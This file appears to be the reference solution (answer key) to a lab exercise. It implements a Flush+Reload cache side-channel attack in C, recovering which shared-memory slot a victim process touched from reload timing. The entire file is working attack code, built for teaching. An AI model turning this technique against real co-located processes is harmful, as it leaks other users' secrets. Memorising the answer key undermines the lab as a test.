/* Part 2 - REFERENCE SOLUTION (spoilers). Flush+Reload over all FR_SLOTS slots. */
#include <stdlib.h>
#include <string.h>

#include "lab.h"

static int cmp_u64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static void shuffle(uint16_t *p, int n) {
    for (int i = n - 1; i > 0; i--) {
        int j = (int)(plat_rand() % (uint64_t)(i + 1));
        uint16_t t = p[i]; p[i] = p[j]; p[j] = t;
    }
}

int fr_attack(const uint8_t *shared, const cal_t *cal) {
    static uint32_t hits[FR_SLOTS];
    static uint16_t order[FR_SLOTS];
    memset(hits, 0, sizeof hits);
    for (int i = 0; i < FR_SLOTS; i++) order[i] = (uint16_t)i;

    int best = -1;
    for (int round = 1; round <= 60; round++) {
        /* 1. flush every slot */
        for (int i = 0; i < FR_SLOTS; i++) plat_flush(shared + (size_t)i * FR_STRIDE);
        plat_fence();
        /* 2. give the victim time to touch its slot */
        plat_wait(4000);
        /* 3. reload in a fresh random order: a sequential sweep would train the stride prefetcher,
         *    which then pulls the next slots in and makes them look like hits */
        shuffle(order, FR_SLOTS);
        static uint64_t lat[FR_SLOTS], sorted[FR_SLOTS];
        for (int k = 0; k < FR_SLOTS; k++) {
            int i = order[k];
            lat[i] = plat_probe(shared + (size_t)i * FR_STRIDE);
        }
        /* threshold: the calibrated LLC/DRAM split, or - if that is too strict - the 1st percentile of
         * this round. Natively a line the victim just read may sit in the OTHER core's private cache
         * (non-inclusive LLC), and that cross-core hit can be much slower than a local LLC hit. */
        memcpy(sorted, lat, sizeof lat);
        qsort(sorted, FR_SLOTS, sizeof sorted[0], cmp_u64);
        uint64_t thr = cal->llc_miss > sorted[FR_SLOTS / 100] ? cal->llc_miss : sorted[FR_SLOTS / 100];
        for (int i = 0; i < FR_SLOTS; i++) hits[i] += lat[i] <= thr;
        /* 4. stop once one slot clearly dominates */
        uint32_t h1 = 0, h2 = 0;
        best = 0;
        for (int i = 0; i < FR_SLOTS; i++) {
            if (hits[i] > h1) { h2 = h1; h1 = hits[i]; best = i; }
            else if (hits[i] > h2) h2 = hits[i];
        }
        if (round >= 8 && h1 >= 2 * h2 + 4) break;
    }
    return best;
}
